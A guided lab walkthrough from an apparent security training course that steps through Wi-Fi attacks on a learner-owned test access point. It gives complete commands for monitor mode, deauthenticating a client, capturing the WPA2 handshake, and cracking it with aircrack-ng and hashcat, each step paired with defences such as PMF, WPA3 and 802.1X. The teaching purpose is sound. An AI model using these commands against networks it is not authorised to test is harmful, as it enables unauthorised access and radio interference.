# Module 16 — Hacking Wireless Networks · Guided Lab Walkthrough

> A step-by-step, **do-it-in-order** lab. Each step gives the command, what you should observe, a hint, and the defender/PAM takeaway. Outputs shown are **representative** — yours will differ.

> ⚠️ **SAFETY / LEGALITY — READ BEFORE YOU TRANSMIT.** Wireless attacks require a **monitor-mode + injection-capable adapter** and you must target **ONLY your own AP and your own client devices**, on an **isolated SSID you control**. Deauth, handshake capture, PMKID grabbing, evil-twin, and WPS attacks against any network you do **not** own or have **written authorization** to test are **illegal** (unauthorized access + interference with regulated radio spectrum) in essentially every jurisdiction. Do **not** target a neighbour's, an employer's, or any public network. If you have **no compatible adapter**, do **not** transmit — **study the workflow** and use your **own sample capture** file instead (see the Hints).

**Goal:** walk the wireless capture-then-crack chain against **your own** test AP, then *watch a defensive control turn the win into a loss.*

**Setup you must own:**
- A **test router/AP** on an **isolated SSID** (e.g. `LAB-TEST`) with a **deliberately weak** WPA2-PSK passphrase that appears in `rockyou.txt` (so the crack finishes). No other real clients on it.
- Your **own** phone/laptop as the single client to deauth.
- A **monitor-capable adapter** (replace `wlan0` below) and Kali (or equivalent) with the aircrack-ng suite, hcxtools, and hashcat installed.
- `rockyou.txt` unpacked (`/usr/share/wordlists/rockyou.txt`).

Replace `wlan0`, the BSSID `AA:BB:CC:DD:EE:FF`, channel `6`, and the client MAC `11:22:33:44:55:66` with **your own** values throughout.

---

## Part A — Monitor mode + scan (find YOUR AP)

### A1. Stop interference and enable monitor mode
```bash
sudo airmon-ng check kill        # stop NetworkManager/wpa_supplicant that fight for the radio
sudo airmon-ng start wlan0       # creates the monitor interface, e.g. wlan0mon
```
**You should see** airmon-ng report the new interface:
```
(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
```
**Observe:** the interface name changes to `wlan0mon` (or similar). Monitor mode lets the card capture *all* nearby 802.11 frames, not just those for your associated network. From here on, use `wlan0mon`.

<details><summary>Hint if monitor mode fails</summary>Not every adapter supports monitor mode/injection — check compatibility first. If `airmon-ng start` errors, confirm the driver with `iw dev` and `airmon-ng` (lists PHY). Verify injection works: `sudo aireplay-ng --test wlan0mon`. **No compatible adapter? Do not transmit — study the workflow and jump to Part C using your own sample capture (`.cap`/`.pcapng`) instead.**</details>

**Defender/PAM view:** a card sitting in monitor/injection mode near your network is exactly what a **WIDS/WIPS** is meant to notice. Enterprise WLANs treat unexpected monitor-mode radios as an event to investigate.

### A2. Survey — identify YOUR AP's BSSID, channel, and encryption
```bash
sudo airodump-ng wlan0mon        # broad survey of all bands/channels
```
**You should see** a live table of nearby APs:
```
 BSSID              PWR  CH  ENC   CIPHER  AUTH  ESSID
 AA:BB:CC:DD:EE:FF  -38   6  WPA2  CCMP    PSK   LAB-TEST
```
**Observe:** note **your** AP's `BSSID`, `CH` (channel), and `ENC/CIPHER` (WPA2 + CCMP). Ignore every other network — you only touch `LAB-TEST`. Press `Ctrl+C` to stop.

<details><summary>Hint: your SSID not showing?</summary>Make sure the test AP is powered and broadcasting, and that you are within range (`PWR` closer to 0 is stronger). If it's on 5 GHz, add `--band a`. **No adapter? Skip transmitting — you already know your own BSSID/channel from the router's admin page; proceed conceptually.**</details>

**Defender/PAM view:** the same survey a defender runs finds **rogue/evil-twin APs** — a duplicate SSID or an unexpected BSSID is the tell. Rogue-AP detection is a core WIPS function.

---

## Part B — Deauth to capture the 4-way handshake (YOUR client only)

### B1. Lock onto your AP's channel and start writing a capture
```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```
**You should see** airodump focus on just your AP and its clients, writing `capture-01.cap`:
```
 CH  6 ][ Elapsed: 12 s ][ WPA handshake:                 <-- (blank until B2)
 BSSID              STATION            PWR   Frames
 AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -40      31
```
**Observe:** the `STATION` list shows **your own** connected client. Leave this terminal running. The top-right `WPA handshake:` field is empty — that's what Part B2 fills.

<details><summary>Hint: no station listed?</summary>The client must be associated to your AP. Reconnect your phone/laptop to `LAB-TEST` and watch it appear under STATION. Confirm you're locked to the right channel (`-c`). **No adapter? Study the field layout here, then use your own sample `.cap` in Part C.**</details>

**Defender/PAM view:** a WLAN controller logs association/reassociation events; a client repeatedly dropping and rejoining is a signal a defender can alert on.

### B2. Deauth your own client to force a reconnect (in a second terminal)
```bash
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```
**You should see** aireplay send deauth bursts, and then airodump's header flip to show the handshake was captured:
```
 Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:66]
```
```
 CH  6 ][ Elapsed: 30 s ][ WPA handshake: AA:BB:CC:DD:EE:FF   <-- captured!
```
**Observe:** knocking your **own** client off forces it to re-associate, and that re-association performs the **4-way handshake** — which airodump just captured into `capture-01.cap`. Keep the deauth count low (`5`); you only need one reconnect.

<details><summary>Hint: no "WPA handshake" appears?</summary>Send another small deauth burst so the client reconnects while airodump is running. Confirm the client MAC (`-c`) is correct. Some clients resist a single deauth — repeat. **No adapter? Do not transmit at all — proceed to Part C with a sample capture you own; the crack step is identical.**</details>

**Defender/PAM view:** this is exactly what **802.11w / PMF** stops — with PMF enabled, the spoofed deauth is **rejected**, no forced reconnect, no handshake. Enterprise WLANs also flag a **burst of deauth/disassoc frames** as a WIDS alert.

---

## Part C — Crack YOUR test PSK offline (aircrack-ng and hashcat)

### C1. Crack the captured handshake with aircrack-ng
```bash
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```
**You should see** aircrack test keys and (because you chose a weak passphrase) recover it:
```
                 [00:00:07] 148213/14344385 keys tested
                 KEY FOUND! [ Password123 ]
```
**Observe:** the passphrase came back **only because it was in the wordlist**. Nothing here touched the AP — every guess was computed **locally, offline**, from the captured handshake. That is the whole point: capture once, crack quietly.

<details><summary>Hint: "No valid WPA handshakes found"?</summary>The `.cap` didn't capture a complete handshake — repeat Part B (deauth so the client reconnects while capturing). Point aircrack at the right `-b` BSSID. **No adapter? Use your own sample capture that contains a handshake — the command is identical.**</details>

### C2. Same crack with hashcat (mode 22000) — the GPU path
```bash
hcxpcapngtool -o hash.22000 capture-01.cap        # convert capture to hashcat 22000 format
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
```
**You should see** hashcat convert then crack, reporting the mode and status:
```
$WPA$*... :Password123
Status...........: Cracked
```
**Observe:** **`-m 22000`** is *the* WPA/WPA2/PMKID mode to memorize (it replaced the old `2500` and `16800`). GPU cracking is dramatically faster than CPU — a defender must assume weak passphrases fall quickly.

<details><summary>Hint: hcxpcapngtool missing or empty output?</summary>Install `hcxtools`. If the `.22000` file is empty, your capture lacks a valid handshake/PMKID — redo Part B. **No adapter? Convert and crack your own sample capture; the mode number and workflow are what matter for the exam.**</details>

### C3. Now defend it — prove the control
Change your test AP's passphrase to a **long random string** (20+ chars, not dictionary-derived), reconnect your client, re-capture (Part B), and re-run C1/C2.
```bash
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-02.cap
```
**You should see** the crack **exhaust the wordlist without success**:
```
                 [00:00:41] 14344385/14344385 keys tested
                 Passphrase not in dictionary
```
**Observe:** the attack still *runs* — you still captured a valid handshake — but the payoff is gone. **WPA2-PSK strength equals passphrase entropy.** The durable fix isn't just a longer passphrase; it's **removing the shared secret** (802.1X/EAP-TLS) and **enabling PMF**.

**Defender/PAM view:** the offline crack is invisible on the wire, so you defend it *before* capture (PMF to block deauth, WPA3-SAE so the capture yields no crackable blob) and *by architecture* — a **PSK is a shared credential**. For any network touching privileged systems, move to **WPA2/WPA3-Enterprise with 802.1X/RADIUS + EAP-TLS**, **vault and rotate the AP/WLC/switch admin creds and the RADIUS shared secret** ([CyberArk mapping](../../defender-pam/cyberark-attack-mapping.md)), and put admin access on a **segmented SSID/VLAN behind NAC**.

---

## What you should conclude
Every "win" above has a specific control that turns it into a contained "loss":

| You did | The control that stops it |
|---|---|
| Enabled monitor mode near the AP | WIDS/WIPS detection of rogue monitor radios |
| Deauthed a client to force a handshake | 802.11w / PMF (rejects spoofed deauth) + WIDS deauth-flood alert |
| Captured the 4-way handshake | WPA3-SAE (capture yields no offline-crackable blob) |
| Cracked the weak PSK offline (aircrack / hashcat -m 22000) | Long random PSK; better: 802.1X/EAP-TLS (no shared secret) |
| Reached the AP/RADIUS admin behind the SSID | Vault + rotate network-device and RADIUS creds; broker via PSM |

## Cleanup
```bash
sudo airmon-ng stop wlan0mon           # leave monitor mode
sudo systemctl restart NetworkManager  # restore normal Wi-Fi
rm -f capture-*.cap hash.22000         # remove captures and cracked material
# restore your test AP to a strong passphrase (or WPA3/Enterprise) and re-enable PMF
```

## Record it
Log commands, outputs, and what surprised you in the **My lab log** table at the bottom of [README.md](README.md), and note any misses in [PROGRESS.md](../../PROGRESS.md).
